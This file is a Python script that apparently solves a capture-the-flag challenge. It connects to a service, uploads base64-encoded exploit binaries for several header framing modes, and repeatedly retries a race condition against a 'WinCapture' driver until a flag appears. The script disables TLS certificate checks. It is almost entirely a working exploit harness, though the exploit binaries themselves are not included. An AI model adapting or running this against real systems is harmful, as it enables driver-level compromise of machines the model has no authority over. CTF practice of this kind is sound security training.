#!/usr/bin/env python3
from __future__ import annotations
import argparse, base64, pathlib, re, socket, ssl, sys, time

PROMPT = b"Waiting for exploit.exe"


def recv_until(sock, needle: bytes, timeout: float) -> bytes:
    sock.settimeout(timeout)
    out = bytearray()
    while needle not in out:
        chunk = sock.recv(65536)
        if not chunk:
            raise RuntimeError("server closed before upload prompt")
        out += chunk
    return bytes(out)


def run_once(host: str, port: int, blob: bytes, tls: bool, timeout: float) -> bytes:
    raw = socket.create_connection((host, port), timeout=15)
    sock = ssl._create_unverified_context().wrap_socket(raw, server_hostname=host) if tls else raw
    with sock:
        banner = recv_until(sock, PROMPT, 25)
        sys.stdout.buffer.write(banner)
        sys.stdout.buffer.flush()
        enc = base64.b64encode(blob)
        for i in range(0, len(enc), 76):
            sock.sendall(enc[i:i+76] + b"\n")
        sock.sendall(b"END\n")
        sock.settimeout(timeout)
        out = bytearray()
        while True:
            try:
                part = sock.recv(65536)
            except socket.timeout:
                break
            if not part:
                break
            out += part
            sys.stdout.buffer.write(part)
            sys.stdout.buffer.flush()
        return bytes(out)


def find_flag(data: bytes):
    for pat in (rb'(?:[A-Za-z0-9_]+)?CTF\{[^}\r\n]+\}', rb'(?:omni|OMNI)\{[^}\r\n]+\}', rb'[A-Za-z0-9_]+\{[^}\r\n]{4,}\}'):
        m = re.search(pat, data)
        if m:
            return m.group().decode(errors="replace")
    return None


def main() -> int:
    ap = argparse.ArgumentParser(description="Probe WinCapture pipe framing, then race the driver")
    ap.add_argument("host")
    ap.add_argument("port", type=int)
    ap.add_argument("--ssl", action="store_true")
    ap.add_argument("--timeout", type=float, default=90.0)
    ap.add_argument("--attempts", type=int, default=30, help="race retries after a framing mode reaches initialization")
    args = ap.parse_args()

    here = pathlib.Path(__file__).resolve().parent
    modes = [2, 1, 4, 3, 5, 6, 7, 8, 9]

    for mode in modes:
        path = here / f"exploit_m{mode}.exe"
        if not path.exists():
            continue
        blob = path.read_bytes()
        max_tries = args.attempts
        for attempt in range(1, max_tries + 1):
            print(f"\n[*] header-mode={mode} attempt {attempt}/{max_tries} ({len(blob)} bytes)", flush=True)
            try:
                out = run_once(args.host, args.port, blob, args.ssl, args.timeout)
            except Exception as exc:
                print(f"[-] transport error: {exc}", flush=True)
                time.sleep(0.5)
                continue

            flag = find_flag(out)
            if flag:
                print(f"\n[+] FLAG: {flag}")
                return 0

            low = out.lower()
            # Semantic/framing failures cannot be fixed by racing; move on.
            fatal_markers = (
                b"stage_alloc status=", b"no reply to stage_alloc",
                b"key_alloc status=", b"no reply to key_alloc",
                b"initial capture_load failed",
            )
            if any(x in low for x in fatal_markers):
                print(f"[-] mode {mode} rejected during initialization; trying next layout", flush=True)
                break

            if b"racing commit" in low:
                print("[-] framing and initialization succeeded; retrying the race", flush=True)
                time.sleep(0.25)
                continue

            print("[-] no decisive marker; trying this mode again", flush=True)
            time.sleep(0.5)

    print("[-] all framing modes exhausted without a flag", flush=True)
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
